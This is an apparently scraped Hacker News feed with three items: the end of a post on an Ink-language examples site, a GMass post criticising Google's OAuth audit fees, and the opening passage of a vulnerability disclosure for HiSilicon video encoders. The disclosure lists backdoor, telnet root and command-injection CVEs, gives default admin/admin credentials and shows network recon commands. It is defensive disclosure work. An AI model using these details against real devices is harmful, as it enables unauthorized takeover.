  <img alt="The Random example page that explains how rand() and urand() work" title="The Random example page that explains how rand() and urand() work" src="https://d33wubrfki0l68.cloudfront.net/12776e36491c70456781464bfd2e1a46c813a4a0/55c56/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png" srcset="https://d33wubrfki0l68.cloudfront.net/ac7b7b3f1ab05213b586aa2d68f52ae05768e98c/f68c1/static/67e41456d3cd45e1904a481615c03fb8/5a46d/example.png 300w,
https://d33wubrfki0l68.cloudfront.net/c02a29e120f10890078f58281a553fcfbd2a9078/5c915/static/67e41456d3cd45e1904a481615c03fb8/0a47e/example.png 600w,
https://d33wubrfki0l68.cloudfront.net/12776e36491c70456781464bfd2e1a46c813a4a0/55c56/static/67e41456d3cd45e1904a481615c03fb8/f1901/example.png 942w" sizes="(max-width: 942px) 100vw, 942px" loading="lazy">
  </a>
    </span></p>
<p>The build tool chain for the project is powered by Ink and the <a href="https://github.com/healeycodes/inkbyexample">repository</a> builds and deploys to Netlify on commits to the main branch. </p>
<p>I set it up to be fairly hackable. There are two HTML templates (bases for index and example) that are imported as strings and formatted with Ink‚Äôs <code>std.format</code>. The order that the examples are shown is controlled by <code>examples.ink</code>. The program files are structured like a table with documentation and code in parallel cells.</p>
<p>The program files are turned into executable code and evaluated when the test or build commands are ran. This was useful during development because it gave me full certainty that these code examples actually worked. (Unit tests would have been better!)</p>
<p>The templates are compiled and written to <code>/public</code> as HTML files, along with a few static files like CSS and an <code>og:image</code>.</p>
<p>For syntax highlighting, I read through another Ink project called <a href="https://github.com/thesephist/september">September</a> and saw that it provided a print command that sent Ink source code to the terminal with syntax highlighting via ANSI escape codes. I imported the files required for highlighting and altered the escape code functions to instead wrap the lines in <code>&lt;span&gt;</code> elements with different class names.</p>
<div data-language="ink"><pre><code>` before: if comment, apply ansi.Gray function `
(Tok.Comment) -&gt; Gray

` after: if comment, wrap in span to target via class in HTML `
(Tok.Comment) -&gt; s =&gt; '&lt;span class="c"&gt;' + s + '&lt;/span&gt;'</code></pre></div>
<p>The annotated examples programs are designed to print out a lot of data. This is rendered under the source code as if the file has been ‚Äòran‚Äô in a terminal to create a natural feel for an intermediate programmer and to show the shape of the data we‚Äôre dealing with.</p>
<p><span>
      <a href="https://healeycodes.com/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The section of output under the annotated program as if it has been ran via terminal" title="The section of output under the annotated program as if it has been ran via terminal" src="https://d33wubrfki0l68.cloudfront.net/075b2e15813b85b97af09761104ef85c55c9878c/0e076/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png" srcset="https://d33wubrfki0l68.cloudfront.net/0e54072057bc336bed318e160c9e067e964d5aea/d1983/static/1ff63ca42124214c2cda9a5d999dbfac/5a46d/output.png 300w,
https://d33wubrfki0l68.cloudfront.net/075b2e15813b85b97af09761104ef85c55c9878c/0e076/static/1ff63ca42124214c2cda9a5d999dbfac/29f4e/output.png 506w" sizes="(max-width: 506px) 100vw, 506px" loading="lazy">
  </a>
    </span></p>
<p>Since everything builds to a folder called <code>/public</code>, the Netlify configuration is just two lines long. The build time is 17 seconds long.</p>
<div data-language="toml"><pre><code><span>[</span><span>build</span><span>]</span>
  <span>publish</span> <span>=</span> <span>"public/"</span>
  <span>command</span> <span>=</span> <span>"make build-linux"</span></code></pre></div>
<h2 id="why-learn-ink-at-all"><a href="#why-learn-ink-at-all" aria-label="why learn ink at all permalink"></a>Why Learn Ink At All?</h2>
<p>Sometimes I am too career driven in the languages and technologies that I pick up. So I wanted to make sure that I was still learning to explore and be creative ‚Äî unencumbered by StackOverflow surveys that detail what technologies make you most employable. And what is more esoteric than a language that only two people actively code with (to my knowledge: myself and Linus).</p>
<p>I find Ink enjoyable to write code with. It‚Äôs terse, functional, and for small solutions it‚Äôs extremely clear to read. Programs are easy to share and deploy; a binary and a script. After reading some of Linus‚Äôs passionate <a href="https://dotink.co/posts/">technical articles</a> about Ink I felt an unexplainable yearning to try it out. So I did.</p>
<p>The future of Ink sounds exciting. I caught up with Linus a few days ago and he hinted at an experimental implementation written in Rust. He suggested some language problems that might be fixed too. He also pointed me towards resources on interpreters and compilers which I‚Äôve been devouring. Who knows ‚Äî maybe I‚Äôll be writing about my own programming language one day soon.</p></section></div>]]>
            </description>
            <link>https://healeycodes.com/learning-the-ink-programming-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517321</guid>
            <pubDate>Fri, 18 Sep 2020 14:38:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[WTF: Google‚Äôs OAuth verification process and security assessment]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24516706">thread link</a>) | @JaneKCall
<br/>
September 18, 2020 | https://www.gmass.co/blog/google-oauth-verification-security-assessment/ | <a href="https://web.archive.org/web/*/https://www.gmass.co/blog/google-oauth-verification-security-assessment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9167">
	<!-- <header class="entry-header"> -->
					<!-- <div class="entry-meta"> -->
							<!-- </div> -->
			<!-- </header> -->

	
	<div>
		<p>Last October, <a href="https://cloud.google.com/blog/products/g-suite/elevating-user-trust-in-our-api-ecosystems">Google announced that it would start being more stringent</a> with software vendors <strong>building apps on top of the Gmail API</strong>. Specifically,&nbsp;developers using a ‚Äúrestricted‚Äù or ‚Äúsensitive‚Äù Gmail API scope would be subject to additional scrutiny and have to pay a fee of $15,000 ‚Äì $75,000 <em>or more</em> to have a third party security assessment done. GMass leverages the power of the Gmail API to perform its magic, and so GMass has been subject to these measures.</p>
<p>Since Google‚Äôs announcement, the web&nbsp;has become rife with stories of frustration amongst smaller companies and independent developers who simply cannot afford the fee.&nbsp;This&nbsp;new policy stands to kill innovation, be the obstacle to side projects, and overall, make Gmail less useful. One of the primary reasons Gmail has been the email platform of choice for startups and tech companies is that it‚Äôs been extensible. There are&nbsp;<a href="https://www.producthunt.com/e/apps-for-gmail-email">hundreds, if not thousands,&nbsp;of extensions&nbsp;for Gmail</a>, one of which is GMass, that&nbsp;add functionality and make&nbsp;Gmail more useful than the base product. <em>Most of these applications&nbsp;will disappear.</em> Unless a product has reached the point of business sustainability, it won‚Äôt be worth it for most developers to pay the fee and go through the security process (which by the way, will likely cost more than the fee paid, because of development time necessary for remediation).</p>
<p>Well known extensions and Gmail apps like Boomerang, Yesware, Mixmax, and Mailtrack will likely pay the fee and succumb to the new governance, but smaller players like <a href="https://blog.context.io/context-io-deprecation-notice-ce8b77e6e477">Context.io</a> and <a href="https://www.voice2biz.com/oauth-2-0-for-google-apis-3rd-party-audit-costs-require-emailmonkey-to-shutdown/">EmailMonkey have already announced their plans to shut down</a>. I‚Äôve also decided to shut down my other Gmail extension, Wordzen, because the fee is too high to be worth it for Wordzen.</p>
<p>This <a href="https://www.theregister.co.uk/2019/02/11/google_gmail_developer/">article from The Register</a>&nbsp;profiles two makers of Gmail apps, Leave Me Alone and Clean Email,&nbsp;and their frustrations with the new requirements.</p>
<p>Even a popular service like <a href="https://help.ifttt.com/hc/en-us/articles/360020249393-Important-update-about-Gmail-on-IFTTT">IFTTT&nbsp;is caving and reducing&nbsp;its Gmail functionality</a>.</p>
<h3>My stance</h3>
<ol>
<li>I‚Äôm not happy about it, but given the substantial GMass user base, we‚Äôre beginning the process of the security audit. You can follow my <a href="https://www.gmass.co/blog/live-updates-google-oauth-verification-security/">live updates of the OAuth verification process</a>.</li>
<li>I‚Äôm&nbsp;a proponent&nbsp;for greater security and protection of user data, but asking software developers to pay the security fee is ludicrous. Google should pay the fee on behalf of its developers (explanation below).</li>
<li>The opportunity is rife for a new email platform to make a dent in Gmail‚Äôs marketshare.</li>
<li>Prices for all Gmail apps, including GMass, will rise to cover the cost of the annual security assessment.</li>
<li>Google is grasping for straws when justifying making the developers pay. In response to the question ‚Äú<b>Why is Google asking apps to pay for the security assessment?‚Äù </b>they state, ‚ÄúAs we‚Äôve pre-selected industry leading assessors, <strong>the letter of assessment your app will receive can be used for other certifications or customer engagements</strong> where a security assessment is needed.‚Äù <em>Gee thanks, Google, for&nbsp;making it easier for us to get more customer engagements.</em></li>
<li>Google‚Äôs support for developers who build Gmail apps has been poor, and&nbsp;the manner in which&nbsp;this issue is being handled is being done callously. Questions to the OAuth verification team go unanswered for long periods of time. Stack Overflow is <a href="https://stackoverflow.com/questions/tagged/gmail-api">littered with questions about the Gmail API</a>, mostly which go unanswered, <a href="https://developers.google.com/gmail/api/support">despite Google pointing developers to this area</a>. Google has been playing favorites with<a href="https://gsuite.google.com/marketplace/category/works-with-gmail"> Gmail Add-ons</a>, allowing only some to work on iOS while <a href="https://developers.google.com/gsuite/add-ons/guides/restrictions">claiming that iOS isn‚Äôt supported</a>, and not providing any context for its decisions. Additionally, Chrome extensions for Gmail have never been officially sanctioned,&nbsp;although when Gmail launched its new UI last year, it did inform all extension makers of the upcoming changes and provided test accounts. It‚Äôs clear that it‚Äôs up to developers to solve their own issues and work around Google‚Äôs platform shortcomings.</li>
</ol>
<h3>Conflict and Confusion</h3>
<p>There is also conflict and confusion amongst the information released by Google.</p>
<p><strong>Does this process only affect you if your users include gmail.com accounts, or do you have to go through the process even if you just take on G Suite users?</strong></p>
<p>The language in the announcements seem to indicate that&nbsp;this only affects gmail.com consumer accounts wanting access to an app.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/04/Screenshot-2019-04-30-17.32.31.png" alt="" width="1356" height="234">The&nbsp;use of the word ‚Äúmy‚Äù, however, in the question is confusing. It makes the question seem to apply to internal accounts only, those that are owned by the developer of the app. But then the answer references how G Suite administrators can control access, which implies that all external G Suite accounts are included in the group that are not impacted.</p>
<p>In the&nbsp;detailed FAQ about who can skip the review process, one would hope that for consistency with the above that it would say ‚ÄúThose apps that only service G Suite accounts and not consumer gmail.com accounts‚Äù&nbsp;but it doesn‚Äôt. Hmm.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/04/Screenshot-2019-04-30-17.34.49.png" alt="" width="1568" height="658"></p>
<p>Further in the FAQ, we find:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.36.05.png" alt="" width="1358" height="294">The first paragraph references ‚ÄúGoogle Accounts outside of your organization‚Äù which I interpret to include G Suite accounts outside of your organization. But then the second paragraph says that if you don‚Äôt verify, ‚Äúaccess for new users will be disabled‚Äù and ‚Äúexisting grants for consumer accounts will be revoked‚Äù. I interpret that to mean that no new G Suite nor gmail.com users will be able to OAuth connect to your app, but existing G Suite users will still be able to.</p>
<p>Lastly, there‚Äôs this bit:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.37.35.png" alt="" width="1522" height="342">I‚Äôm thoroughly confused at this point.</p>
<p><strong>What happens if you choose to not go through the process? Will your app just show ‚ÄúUnverified‚Äù on the OAuth consent screen, or will it not have access to certain Gmail API scopes altogether?</strong></p>
<p>The documentation is also unclear on this issue. In the User Data Policy, we find:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.46.43.png" alt="" width="1828" height="478"></p>
<p>but this seems to conflict with what‚Äôs shown above:</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.36.05.png" alt="" width="1358" height="294"></p>
<p>Finally this text under the ‚ÄúSensitive Scope Verification‚Äù section seems to indicate that the only consequence of not having your app verified is that users will see that it‚Äôs Unverified.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.49.53.png" alt="" width="1458" height="488"></p>
<p>However, there‚Äôs no equivalent question under the ‚ÄúRestricted Scope Verification‚Äù section:</p>
<figure id="attachment_4202" aria-describedby="caption-attachment-4202"><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.56.27.png" alt="" width="1534" height="1282"><figcaption id="caption-attachment-4202">They really should include the question: ‚ÄúWhat happens if I don‚Äôt verify my app?‚Äù</figcaption></figure>
<p>It would&nbsp;be preferable for the entire developer community if the only consequence of not verifying a sensitive scope app is that users see the ‚ÄúUnverified‚Äù designation when connecting their accounts because it allows users to still use their apps. Personally I&nbsp;wouldn‚Äôt mind if GMass users go to connect their accounts and see that the app is ‚Äúunverified‚Äù,&nbsp;if it weren‚Äôt for the <a href="https://www.dropbox.com/s/v2ipv5oot4qqtwc/Screenshot%202019-05-01%2001.54.43.png?dl=0">100 user cap that is imposed on Unverified Apps</a>. But again, this is only clear for sensitive scope apps and not restricted scope apps.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/Screenshot-2019-05-01-01.54.43.png" alt="" width="1568" height="614"></p>
<h3>The scope of the security audit</h3>
<p>In the <a href="https://support.google.com/cloud/answer/9110914">FAQ</a>, Google states ‚Äúwe are requiring apps that store data on non-Google servers to demonstrate a minimum level of capability in handling data securely and deleting user data upon user request.‚Äù But deeper in the FAQ, the&nbsp;audit also includes developer‚Äôs code deployment practices, which seems to go beyond a minimal level in capability in handling data securely.</p>
<p><img src="https://blogcdn.gmass.co/blog/wp-content/uploads/2019/05/google-oauth-security-audit-web.png" alt="" width="518" height="1371"><br>
<em>Google is in a position of power over its third party developers.</em> After all, where are the developers going to go? We‚Äôve all invested substantially into building our products, many of us make a living off of what we‚Äôve built, so we if we don‚Äôt play by the new rules, it would mark an end to our careers. We could go and build on Outlook.com‚Äôs API instead, but with just two players ‚Äî Google and Microsoft ‚Äî dominating the email ecosystem, there‚Äôs no guarantee that Microsoft won‚Äôt implement the same policies. Such is the risk of building a product on top of someone else‚Äôs.</p>
<h3>Why Google&nbsp;should pay the fee instead</h3>
<p>They can afford to, and it offers a checks and balances between the security firms and Google that doesn‚Äôt exist right now. While developers benefit from building software on top of Gmail, Google too derives benefit from attracting customers to a product that has been made better by all of its third party developers. There are users of Gmail and G Suite that would NOT be users if it weren‚Äôt for their loyalty to a particular third party app. I know for certain that in GMass‚Äôs case, we‚Äôve&nbsp;brought users to G Suite because they wanted to use GMass.</p>
<h3>Resources on&nbsp;the new Google OAuth scope policy</h3>
<p>Google‚Äôs <a href="https://cloud.google.com/blog/products/g-suite/elevating-user-trust-in-our-api-ecosystems">original announcement</a> <span>(cloud.google.com)</span>.</p>
<p>The <a href="https://developers.google.com/terms/api-services-user-data-policy">user data policy</a> <span>(developers.google.com)</span>.</p>
<p>Detailed <a href="https://support.google.com/cloud/answer/9110914?hl=en&amp;ref_topic=3473162">FAQ</a> on the verification process and the security assessment <span>(support.google.com)</span>.</p>
<p>Indie Hackers <a href="https://www.indiehackers.com/forum/psa-new-google-policy-creates-15k-barrier-to-entry-for-apps-using-the-gmail-api-08070e6e4c">discussion</a> of the issue <span>(indiehackers.com)</span>.</p>
<p><a href="https://groups.google.com/forum/#!topic/inboxsdk/6NLvQL-5bic">Inbox SDK discussion</a> on the issue <span>(groups.google.com)</span>.</p>
<div itemtype="http://schema.org/Person" itemscope="" itemprop="author"><p><img alt="" src="https://secure.gravatar.com/avatar/836da7a343d034a72cb44fb28580efe6?s=100&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/836da7a343d034a72cb44fb28580efe6?s=200&amp;d=mm&amp;r=g 2x" height="100" width="100" itemprop="image"></p><div><p>Ajay is the founder of GMass and has been developing email sending software for 20 years.</p></div></div></div><!-- .entry-content -->

	<!-- <footer class="entry-footer"> -->
			<!-- </footer> -->

</article></div>]]>
            </description>
            <link>https://www.gmass.co/blog/google-oauth-verification-security-assessment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516706</guid>
            <pubDate>Fri, 18 Sep 2020 13:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backdoors and other vulnerabilities in HiSilicon based hardware video encoders]]>
            </title>
            <description>
<![CDATA[
Score 188 | Comments 63 (<a href="https://news.ycombinator.com/item?id=24516453">thread link</a>) | @blablablub
<br/>
September 18, 2020 | https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/ | <a href="https://web.archive.org/web/*/https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>15 Sep 2020</span></p><p><img src="https://kojenov.com/assets/2020-09-15-encoders/010-title-bug.png" alt="bug"></p>

<hr>

<p><strong>Update 2020-09-17:</strong> Huawei <a href="https://www.huawei.com/en/psirt/security-notices/2020/huawei-sn-20200917-01-hisilicon-en">issued a statement</a> saying that none of the vulnerabilities have been introduced by HiSilicon chips and SDK packages. I will update this article as more information comes in.</p>

<hr>

<p>This article discloses critical vulnerabilities in IPTV/H.264/H.265 video encoders based on HiSilicon hi3520d hardware. The vulnerabilities exist in the application software running on these devices. All vulnerabilities are exploitable remotely and can lead to sensitive information exposure, denial of service, and remote code execution resulting in full takeover of the device. With multiple vendors affected, and no complete fixes at the time of the publication, these encoders should only be used on fully trusted networks behind firewalls. I hope that my detailed write-up serves as a guide for more security research in the IoT world.</p>

<!--more-->

<ul id="markdown-toc">
  <li><a href="#summary" id="markdown-toc-summary">Summary</a></li>
  <li><a href="#background" id="markdown-toc-background">Background</a></li>
  <li><a href="#hardware" id="markdown-toc-hardware">Hardware</a></li>
  <li><a href="#network-recon" id="markdown-toc-network-recon">Network recon</a>    <ul>
      <li><a href="#23---telnet" id="markdown-toc-23---telnet">23 - telnet</a></li>
      <li><a href="#80-8086---web-application" id="markdown-toc-80-8086---web-application">80, 8086 - web application</a></li>
      <li><a href="#554-8554---rtsp" id="markdown-toc-554-8554---rtsp">554, 8554 - RTSP</a></li>
      <li><a href="#1935---rtmp" id="markdown-toc-1935---rtmp">1935 - RTMP</a></li>
      <li><a href="#5150---serial-to-tcp" id="markdown-toc-5150---serial-to-tcp">5150 - serial to TCP</a></li>
      <li><a href="#9588---another-web-server" id="markdown-toc-9588---another-web-server">9588 - another web server</a></li>
    </ul>
  </li>
  <li><a href="#firmware-analysis" id="markdown-toc-firmware-analysis">Firmware analysis</a>    <ul>
      <li><a href="#content" id="markdown-toc-content">Content</a></li>
      <li><a href="#password-file-and-telnet-access" id="markdown-toc-password-file-and-telnet-access">Password file and telnet access</a></li>
    </ul>
  </li>
  <li><a href="#local-recon" id="markdown-toc-local-recon">Local recon</a>    <ul>
      <li><a href="#the-base-system" id="markdown-toc-the-base-system">The base system</a></li>
      <li><a href="#processes" id="markdown-toc-processes">Processes</a></li>
      <li><a href="#ports" id="markdown-toc-ports">Ports</a></li>
      <li><a href="#dumping-the-file-system" id="markdown-toc-dumping-the-file-system">Dumping the file system</a></li>
    </ul>
  </li>
  <li><a href="#reverse-engineering" id="markdown-toc-reverse-engineering">Reverse engineering</a>    <ul>
      <li><a href="#modifying-the-boot" id="markdown-toc-modifying-the-boot">Modifying the boot</a></li>
      <li><a href="#remote-debugging" id="markdown-toc-remote-debugging">Remote debugging</a></li>
      <li><a href="#decompiling" id="markdown-toc-decompiling">Decompiling</a></li>
    </ul>
  </li>
  <li><a href="#vulnerabilities-and-exploits" id="markdown-toc-vulnerabilities-and-exploits">Vulnerabilities and exploits</a>    <ul>
      <li><a href="#backdoor-password-cve-2020-24215" id="markdown-toc-backdoor-password-cve-2020-24215">Backdoor password (CVE-2020-24215)</a></li>
      <li><a href="#root-access-via-telnet-cve-2020-24218" id="markdown-toc-root-access-via-telnet-cve-2020-24218">root access via telnet (CVE-2020-24218)</a></li>
      <li><a href="#arbitrary-file-disclosure-via-path-traversal-cve-2020-24219" id="markdown-toc-arbitrary-file-disclosure-via-path-traversal-cve-2020-24219">Arbitrary file disclosure via path traversal (CVE-2020-24219)</a></li>
      <li><a href="#unauthenticated-file-upload-cve-2020-24217" id="markdown-toc-unauthenticated-file-upload-cve-2020-24217">Unauthenticated file upload (CVE-2020-24217)</a></li>
      <li><a href="#arbitrary-code-execution-by-uploading-malicious-firmware" id="markdown-toc-arbitrary-code-execution-by-uploading-malicious-firmware">Arbitrary code execution by uploading malicious firmware</a></li>
      <li><a href="#arbitrary-code-execution-via-command-injection" id="markdown-toc-arbitrary-code-execution-via-command-injection">Arbitrary code execution via command injection</a></li>
      <li><a href="#buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214" id="markdown-toc-buffer-overflow-definite-dos-and-potential-rce-cve-2020-24214">Buffer overflow: definite DoS and potential RCE (CVE-2020-24214)</a></li>
      <li></li>
    </ul>
  </li>
  <li><a href="#disclosure" id="markdown-toc-disclosure">Disclosure</a>    <ul>
      <li><a href="#affected-vendors" id="markdown-toc-affected-vendors">Affected vendors</a></li>
      <li><a href="#coordinated-disclosure" id="markdown-toc-coordinated-disclosure">Coordinated disclosure</a></li>
      <li><a href="#remediation" id="markdown-toc-remediation">Remediation</a></li>
    </ul>
  </li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
  <li><a href="#exploit-demos" id="markdown-toc-exploit-demos">Exploit demos</a></li>
  <li><a href="#exploit-scripts" id="markdown-toc-exploit-scripts">Exploit scripts</a></li>
  <li><a href="#links" id="markdown-toc-links">Links</a></li>
</ul>

<h2 id="summary">Summary</h2>

<p>The following vulnerabilities were identified:</p>

<ul>
  <li>Critical
    <ul>
      <li>Full admin interface access via backdoor password (CVE-2020-24215)</li>
      <li>root access via telnet (CVE-2020-24218)</li>
      <li>Arbitrary file disclosure via path traversal (CVE-2020-24219)</li>
      <li>Unauthenticated file upload (CVE-2020-24217)
        <ul>
          <li>Arbitrary code execution via malicious firmware upload</li>
          <li>Arbitrary code execution via command injection</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>High
    <ul>
      <li>Denial of service via buffer overflow (CVE-2020-24214)</li>
    </ul>
  </li>
  <li>Medium
    <ul>
      <li>Unauthorized RTSP video stream access (CVE-2020-24216)</li>
    </ul>
  </li>
</ul>

<p>See <a href="https://www.kb.cert.org/vuls/id/896979">CERT/CC vulnerability note VU#896979</a></p>

<p>During my research I had physical access to several devices from the following vendors: <a href="http://szuray.com/">URayTech</a>, <a href="https://jtechdigital.com/product/jtech-ench4-0220/">J-Tech Digital</a>, and <a href="https://www.provideoinstruments.com/iptv-encoders">Pro Video Instruments</a>. I performed my research initially on URayTech, then confirmed vulnerabilities in the other two vendors.</p>

<p>There is at least a dozen of different vendors that manufacture and sell very similar devices. By analyzing product documentation and firmware update packages, I‚Äôve got a high level of confidence those devices were also affected by most, if not all, vulnerabilities listed here. Here is an [incomplete] list of these additional vendors: <a href="http://www.networktechinc.com/h264-hdmi-encoder.html"><em>Network Technologies Incorporated (NTI)</em></a>, <a href="https://www.oupree.com/IP-Video-Encoder-Decoder/"><em>Oupree</em></a>, <a href="http://www.szmine.com/Video_Encoder/"><em>MINE Technology</em></a>, <a href="https://www.blankom.de/products/irenis-ip-encoder-streamer/"><em>Blankom</em></a>, <a href="https://www.iseevy.com/product-category/video-encoder/"><em>ISEEVY</em></a>, <a href="https://www.orivision.com.cn/c/h264-hdmi-encoder_0017"><em>Orivision</em></a>, <a href="https://www.procoderhd.com/">WorldKast/procoder</a>, <a href="http://www.digicast.cn/en/product.asp?pType=222">Digicast</a></p>

<p>It is my understanding that most of these devices are intended to be used behind NAT/firewall. However, I was able to utilize <a href="http://shodan.io/">shodan.io</a> to identify several hundred devices on the public internet, all likely to be exploitable by an anonymous remote attacker.</p>

<h2 id="background">Background</h2>

<p>Hardware video encoders are used for video streaming over IP networks. They convert raw video signals (such as analog, SDI, HDMI) to H.264 or H.265 streams and send them to a video distribution network (YouTube, Twitch, Facebook,‚Ä¶) or let the users watch the video directly via RTSP, HLS, etc. Normally, these encoders have a web interface to allow the administrator to configure networking, encoding parameters, streaming options, and so on. Many such devices on the market today are based on <a href="http://www.hisilicon.com/en/">HiSilicon</a> (a Huawei brand) hi3520d ARM SoC running a special Linux distribution called HiLinux, with a set of user-space utilities and a custom web application on top.</p>

<p>Security research on HiSilicon devices has been done in the past. Here are some existing publications:</p>

<ul>
  <li><a href="https://habr.com/ru/post/173501/">Root shell in IP cameras</a> (in Russian) by Vladislav Yarmak, 2013. The research uncovered the root password allowing root shell access over telnet.</li>
  <li><a href="https://github.com/tothi/pwn-hisilicon-dvr">HiSilicon DVR hack</a> by Istvan Toth, 2017. This research targeted DVR/NVR devices, and uncovered a root shell access with elevated privileges, a backdoor password, a file disclosure via path traversal, and an exploitable buffer overflow.</li>
  <li><a href="https://habr.com/en/post/486856/">Full disclosure: 0day vulnerability (backdoor) in firmware for Xiaongmai-based DVRs, NVRs and IP cameras</a> by Vladislav Yarmak. This research uncovered a very interesting ‚Äúport knocking‚Äù backdoor allowing a remote attacker to start the telnet, and then log in with one of the several known passwords.</li>
</ul>

<p>While the streaming video encoders may share the same hardware architecture and the underlying Linux system with the above devices, my research targets the <strong>admin web application specific to the video encoders</strong> and does not overlap with the prior work.</p>

<h2 id="hardware">Hardware</h2>

<p>Here is a few pictures of one of the devices I had an opportunity to test.
<img src="https://kojenov.com/assets/2020-09-15-encoders/050-encoder.jpg" alt="hardware">
Physical ports
<img src="https://kojenov.com/assets/2020-09-15-encoders/060-encoder.jpg" alt="hardware">
Top cover off. The right side, from top to bottom: LAN, HDMI out, reset, HDMI in, LEDs, audio in
<img src="https://kojenov.com/assets/2020-09-15-encoders/070-encoder.jpg" alt="hardware">
Let‚Äôs plug this thing in, connect to network, and start exploring!</p>

<h2 id="network-recon">Network recon</h2>

<p>A simple <code>nmap</code> scan reports the following open ports:</p>

<div><div><pre><code>$ nmap -p 1-65535 encoder
...
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
554/tcp  open  rtsp
1935/tcp open  rtmp
5150/tcp open  atmp
8086/tcp open  d-s-n
8554/tcp open  rtsp-alt
9588/tcp open  unknown
</code></pre></div></div>

<h3 id="23---telnet">23 - telnet</h3>

<p>Telnet displays the login prompt, but the password is unknown at this point:</p>



<h3 id="80-8086---web-application">80, 8086 - web application</h3>

<p>Both ports serve the main admin web interface. The default credentials are <strong>admin/admin</strong>
<img src="https://kojenov.com/assets/2020-09-15-encoders/110-login.png" alt="login"></p>

<p>The login prompt suggests basic HTTP authentication, but this is actually <a href="https://en.wikipedia.org/wiki/Digest_access_authentication">digest authentication</a>. The following header is returned by the application:</p>

<div><div><pre><code>WWW-Authenticate: Digest qop="auth", ...
</code></pre></div></div>

<p>and the browser authenticates with:</p>

<div><div><pre><code>Authorization: Digest username="admin", ...
</code></pre></div></div>

<p>(as I will demonstrate below, digest is not the only authentication method supported by the application)</p>

<p>After logging in, the user sees a simple web interface.
<img src="https://kojenov.com/assets/2020-09-15-encoders/120-status.png" alt="status"></p>

<p>Note that vendors customize the interface, and your device can display something completely different, such as:
<img src="https://kojenov.com/assets/2020-09-15-encoders/130-status.png" alt="status">However, the underlying functionality (the web API calls) are all the same regardless of the UI.</p>

<p>There are several sections where the administrator can perform various tasks such as setting up the network, adjusting encoder parameters, uploading images to overlay the video, upgrading the firmware, and so on.</p>

<h3 id="554-8554---rtsp">554, 8554 - RTSP</h3>

<p>RTSP stands for <a href="https://en.wikipedia.org/wiki/Real_Time_Streaming_Protocol">Real Time Streaming Protocol</a>. If it‚Äôs enabled, one can watch the video stream directly from the encoder.</p>

<div><div><pre><code>$ curl -i rtsp://encoder:554
RTSP/1.0 200 OK
CSeq: 1
Server: Server Version 9.0.6
Public: OPTIONS, DESCRIBE, PLAY, SETUP, SET_PARAMETER, GET_PARAMETER, TEARDOWN
</code></pre></div></div>

<h3 id="1935---rtmp">1935 - RTMP</h3>

<p><a href="https://en.wikipedia.org/wiki/Real-Time_Messaging_Protocol">Real Time Messaging Protocol</a>, another way to deliver video</p>

<h3 id="5150---serial-to-tcp">5150 - serial to TCP</h3>

<p>Mysterious service. <code>netcat</code> connects but the server does not seem to react to any input</p>

<div><div><pre><code>$ nc -v encoder 5150
Connection to encoder 5150 port [tcp/*] succeeded!
foo
bar
...
</code></pre></div></div>

<p>This initially puzzled me, but when playing with devices from other vendors I noticed that some firmwares allowed control over this port:
<img src="https://kojenov.com/assets/2020-09-15-encoders/140-serial.png" alt="serial"></p>

<h3 id="9588---another-web-server">9588 - another web server</h3>

<p>This one is <code>nginx</code>, but not exactly clear what it is for.</p>

<div><div><pre><code>$ curl -i http://encoder:9588
HTTP/1.1 200 OK
Server: nginx/1.6.0
Date: Thu, 22 Mar 2018 14:28:13 GMT
Content-Type: text/html
Content-Length: 612
Last-Modified: Wed, 05 Dec 2018 10:58:31 GMT
Connection: keep-alive
ETag: "5c07af57-264"
Accept-Ranges: bytes

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Welcome to nginx!&lt;/title&gt;
...
</code></pre></div></div>

<h2 id="firmware-analysis">Firmware analysis</h2>

<p>Clicking around the web interface, I noticed the backup feature:
<img src="https://kojenov.com/assets/2020-09-15-encoders/150-backup.png" alt="backup">
I immediately went ahead and backed up (i.e. downloaded) both the firmware and the configuration.</p>

<h3 id="content">Content</h3>

<p>The firmware backup is a RAR archive that can be easily unpacked:</p>

<div><div><pre><code>$ file up.rar
up.rar: RAR archive data, v4, os: Win32

$ mkdir up
$ cd up
$ unrar ../up.rar
...
</code></pre></div></div>

<p>Here is the directory structure:</p>

<div><div><pre><code>$ tree -d
.
‚îú‚îÄ‚îÄ disk
‚îú‚îÄ‚îÄ ko
‚îÇ   ‚îî‚îÄ‚îÄ extdrv
‚îú‚îÄ‚îÄ lib
‚îú‚îÄ‚îÄ nginx
‚îÇ   ‚îú‚îÄ‚îÄ conf
‚îÇ   ‚îú‚îÄ‚îÄ html
